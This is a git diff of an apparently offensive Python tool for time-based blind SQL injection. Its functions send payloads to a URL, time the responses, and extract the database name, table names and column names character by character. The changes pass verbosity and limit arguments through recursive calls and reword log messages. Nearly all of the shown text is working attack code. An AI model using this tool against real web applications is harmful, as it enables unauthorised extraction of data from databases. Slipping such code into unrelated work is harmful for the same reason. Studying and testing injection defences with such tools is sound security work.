@@ -116,11 +116,11 @@ def attack_one_payload(url, params, payload, verbose=0):
     params=urlencode_in_tags(params)
     response_time=get_request(url, params)
     if check_response_time(response_time):
-        if verbose > 1:
+        if verbose > 2:
             print_greenb('[+] Effective payload')
         return True
     else:
-        if verbose > 1:
+        if verbose > 2:
             print_redb('[-] Non effective payload')
         return False
 
@@ -172,7 +172,7 @@ def attack_get_column(url, params, length, table, mask_with_fuzz, column_name=""
                 if verbose>=1:
                     print_greenb("[+] Retrieve "+ d + " name for table "+table+" : Length " + str(length) + ", Step retrieve :" + mask)
                 i=i+1
-                return char + attack_get_column(url, params, length - 1, table, mask_with_fuzz, column_name+char, i=i)
+                return char + attack_get_column(url, params, length - 1, table, mask_with_fuzz, column_name+char, i=i, verbose=verbose, limit=limit)
     print_redb('[-] Erreur: Caracter not in alphabet')
     return " "
 
@@ -194,7 +194,7 @@ def attack_get_information(url, params, length, database_name="", database=True,
             else:
                 if verbose>=1:
                     print_greenb("[+] Retrieve "+ d + " name : Length " + str(length) + ", Step retrieve :" + mask)
-                return char + attack_get_information(url, params, length - 1, database_name+char, database, fuzz=fuzz)
+                return char + attack_get_information(url, params, length - 1, database_name+char, database, fuzz=fuzz, verbose=verbose, limit=limit)
     print_redb('[-] Erreur: Caracter not in alphabet')
     return " "
 
@@ -207,13 +207,13 @@ def attack_main(url, params, verbose=0):
     else:
         return -1
     print_blue("[X] Retrieve database name")
-    database_name = attack_get_information(url, params, database_length)
+    database_name = attack_get_information(url, params, database_length, verbose=verbose)
     print_greenb("[+] Database name : " + database_name)
     for fuzz in TABLES_FUZZING:
-        print_blue("[X] Retrieve number of tables with column fuzzing:" + fuzz)
+        print_blue("[X] Retrieve number of tables with column like:%" + fuzz + "%")
         nb_tables = attack_get_nb(url,params,fuzz)
         if database_length != -1:
-            print_greenb("[+] We got " + str(nb_tables) +" number of tables with column fuzzing:" + fuzz)
+            print_greenb("[+] We got " + str(nb_tables) +" number of tables with column like:%" + fuzz + "%")
         else:
             return -1
         print_blue("[X] Retrieve tables names")
@@ -225,7 +225,7 @@ def attack_main(url, params, verbose=0):
             else:
                 return -1
             print_blue("[X] Retrieve table name")
-            table = attack_get_information(url, params, table_length, "",False, fuzz, verbose, i)
+            table = attack_get_information(url, params, table_length, "",False, fuzz=fuzz, verbose=verbose, limit=i)
             print_greenb("[+] Table : " + table)
             print_blue("[X] Retrieve table column for table " + table)
             print_blue("[X] Retrieve table column length for table " + table)
